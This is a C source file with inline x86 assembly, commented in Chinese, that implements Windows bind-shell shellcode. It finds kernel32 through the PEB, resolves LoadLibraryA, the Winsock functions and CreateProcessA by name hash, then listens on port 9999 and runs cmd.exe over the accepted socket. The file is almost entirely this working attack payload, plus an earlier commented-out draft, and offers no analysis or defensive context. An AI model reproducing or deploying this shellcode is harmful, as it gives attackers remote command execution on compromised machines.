#include <stdio.h>
#include <windows.h>

//int main()
//{
//	_asm
//	{
//		mov eax, fs:[0x30];
//		mov eax, [eax + 0xc];
//		mov eax, [eax + 0x1c];
//		mov eax, [eax];
//		mov ebx, [eax + 8];
//	}
//	_asm
//	{
//		lea eax, [ebx + 0x3c];
//		mov eax, [eax];
//		lea eax, [eax + ebx];
//	}
//	_asm
//	{
//		lea ecx, [eax + 0x78];
//		mov ecx, [ecx];
//		lea ecx, [ecx + ebx];
//	}
//	//ecx = expTabVA, ebx = IMAGEBASE
//	_asm
//	{
//		mov edx, [ecx + 0x1c];//IATVA
//		add edx, ebx;
//		mov esi, [ecx + 0x20];//INTVA
//		add esi, ebx;
//		mov edi, [ecx + 0x24];//IOTVA
//		add edi, ebx;
//	}
//	_asm
//	{
//		push 0x0c917432;//LoadLibrary
//		call fun_getAddrFromHash_;
//		add eax, ebx;
//		
//	}
//	_asm
//	{
//		
//	}
//fun_getAddrFromHash_:
//	_asm
//	{
//		push ebp;
//		mov ebp, esp;
//		push edx;
//		push esi;
//		push edi;
//		xor eax, eax;
//		jmp stt_;
//	ctn_:
//		inc eax;
//	stt_:
//		lea edx, [esi + 4 * eax];
//		mov edx, [edx];
//		lea edx, [edx + ebx];
//		push eax;
//		push edx;
//		call fun_Hash_;
//		cmp eax, [ebp + 8];
//		pop eax;
//		jne ctn_;
//		pop edi;
//		pop esi;
//		pop edx;
//		mov esp, ebp;
//		pop ebp;
//		ret 4;
//	}
//fun_Hash_:
//	_asm
//	{
//		push ebp;
//		mov ebp, esp;
//		push esi;
//		mov esi, edx;
//		xor edx, edx;
//		xor eax, eax;
//	hash_loop_:
//		lodsb;
//		cmp eax, 0;
//		je end_hash_loop_;
//		ror edx, 7;
//		add edx, eax;
//		jmp hash_loop_;
//	end_hash_loop_:
//		lea eax, [eax + edx];
//		pop esi;
//		mov esp, ebp;
//		pop ebp;
//		ret 4;
//	}
//OVER_:
//	return 0;
//}


int main()
{
	_asm
	{
		

		call next_;
	next_:
		pop esi;
		//提升堆栈,防止shellcode被破坏
		sub esp, 0x20;
		

		mov[ebp - 4], esi;//得到当前EIP位置
		jmp shellBegin_;//跳过数据
	ws2_32_dll_:
		_emit 0x77; 
		_emit 0x73;
		_emit 0x32;
		_emit 0x5F;
		_emit 0x33;
		_emit 0x32;
		_emit 0x2E;
		_emit 0x64;
		_emit 0x6C;
		_emit 0x6C;
		_emit 0;
	cmd_exe_:
		_emit 0x63; 
		_emit 0x6D;
		_emit 0x64;
		_emit 0x2E;
		_emit 0x65;
		_emit 0x78;
		_emit 0x65;
		_emit 0;
	shellBegin_:
		//1.得到kernel32.dll地址
		mov eax, fs : [0x30];
		mov eax, [eax + 0xc];
		mov eax,[eax + 0x1c];
		mov eax, [eax];
		mov eax, [eax + 8];
		push eax;									//kernel32基址入栈
		//2.得到LoadLibraryA地址
		push eax;
		push 0x0c917432; //LoadLibraryA hash;
		call fun_getAddrByHash_;
		push eax;									//LoadLibraryA地址入栈
		//3.加载ws2_32.dll
		mov edx, [ebp - 4];
		add edx, 9;
		push edx;
		call eax;
		push eax;									//ws2_32.dll基址入栈
		//4.获取WSAStartup, WSASOCK,bind,listen,accept函数地址
		push eax;
		push 0x80b46a3d;
		call fun_getAddrByHash_;
		push eax;									//WSAStartup地址入栈
		push[esp + 4];
		push 0xde78322d;
		call fun_getAddrByHash_;
		push eax;									//WSASocketA地址入栈
		push[esp + 8];
		push 0xddbfa6f3;
		call fun_getAddrByHash_;					//htons地址入栈
		push eax;
		push[esp + 0xc];
		push 0xdda71064;
		call fun_getAddrByHash_;					//bind地址入栈
		push eax;
		push[esp + 0x10];
		push 0x4bd39f0c;
		call fun_getAddrByHash_;					//listen地址入栈
		push eax;
		push[esp + 0x14];
		push 0x01971eb1;
		call fun_getAddrByHash_;					//accept地址入栈
		push eax;
		mov esi, esp;	//esi记录函数地址位置,方便之后访问
	payLoad_:
		sub esp, 200h;
		push esp;
		push 0x0202;
		call[esi + 0x14];//初始化SOCKET
		
		push 0;
		push 0;
		push 0;
		push 6;
		push 1;
		push 2;
		call[esi + 0x10];//创建SOCKET
		push eax;//sock入栈
		push 9999;
		call[esi + 0x0c];//htons
		push edi;

		lea edi, [esp + 8];
		xchg ecx, eax;
		mov eax, 2;
		stosw;
		xchg ecx, eax;
		stosw;
		xor eax, eax;
		mov ecx, 3;
		rep stosd;

		push 0x10;
		sub edi, 0x10;
		push edi;
		push[esp + 0xC];
		call[esi + 8];//bind函数

		pop edi;

		push 5;
		push[esp + 4];
		call[esi + 4];//listen
		
		push 0;
		push 0;
		push[esp + 8];
		call[esi];//accept
		push eax;//保存端口

		mov edi, [ebp - 0xc];
		lea edi, [esp + 8];
		push edi;//pi
		add edi, 0x10;
		xor eax, eax;
		mov ecx, 11;
		rep stosd;
		mov[edi], 0x44;
		add edi, 0x2c;
		mov[edi], 0x100;
		add edi, 0xc;
		mov eax, [esp + 8];
		mov[edi], eax;
		add edi, 4;
		mov[edi], eax;
		add edi, 4;
		mov[edi], eax;
		sub edi, 0x40;
		push edi;//si
		push 0;
		push 0;
		push 0;
		push 1;
		push 0;
		push 0;
		mov eax, [ebp - 4];
		add eax, 0x14;
		push eax;//cmd.exe
		push 0;
		push[ebp - 8];
		push 0x6ba6bcc9;
		mov edi, [ebp - 0xc];
		call fun_getAddrByHash_;//得到CREATEPROCESSA地址
		call eax;

	fun_getAddrByHash_://(DWORD dwHash, DWORD dwDllBaseAddr)
		push ebp;
		mov ebp, esp;
		sub esp, 0x10;
		push esi;

		mov ebx, [ebp + 0xc];//ebx=dllBase
		mov eax, [ebx + 0x3c];
		lea ecx, [eax + ebx];//ecx=NT_header
		add ecx, 0x78;
		mov eax, [ecx];
		add eax, ebx;//eax为expTabVA

		mov edx, [eax + 0x1c];
		add edx, ebx;//EATVA   --EDX
		mov esi, [eax + 0x20];
		add esi, ebx;//ENTVA   --ESI
		mov edi, [eax + 0x24];
		add edi, ebx;//EOTVA   --EDI
		xor eax, eax;
		jmp stt1_;
	loop1_:
		inc eax;
	stt1_:
		push eax;
		lea ecx, [esi + 4 * eax];
		mov ecx, [ecx];
		add ecx, ebx;//函数名字符串地址VA
		push ecx;
		call fun_Hash_;
		cmp eax, [ebp + 8];
		pop eax;
		jne loop1_;
		//eax是ENT索引,edi=eotVA,edx=eatVA
		
		mov ax, word ptr[edi + 2 * eax];
		and eax, 0xffff;
		mov eax, [edx + 4 * eax];
		add eax, ebx;

		pop esi;
		mov esp, ebp;
		pop ebp;
		ret 8;
	fun_Hash_:
		push ebp;
		mov ebp, esp;
		sub esp, 0x10;
		
		push esi;
		push edx;

		mov esi, [ebp + 8];
		xor edx, edx;
		xor eax, eax;
	hash_loop_:
		lodsb;
		cmp eax, 0;
		je end_hash_loop_;
		ror edx, 7;
		add edx, eax;
		jmp hash_loop_;
	end_hash_loop_:
		lea eax, [eax + edx];

		pop edx;
		pop esi;

		mov esp, ebp;
		pop ebp;
		ret 4;
	}
	return 0;
}


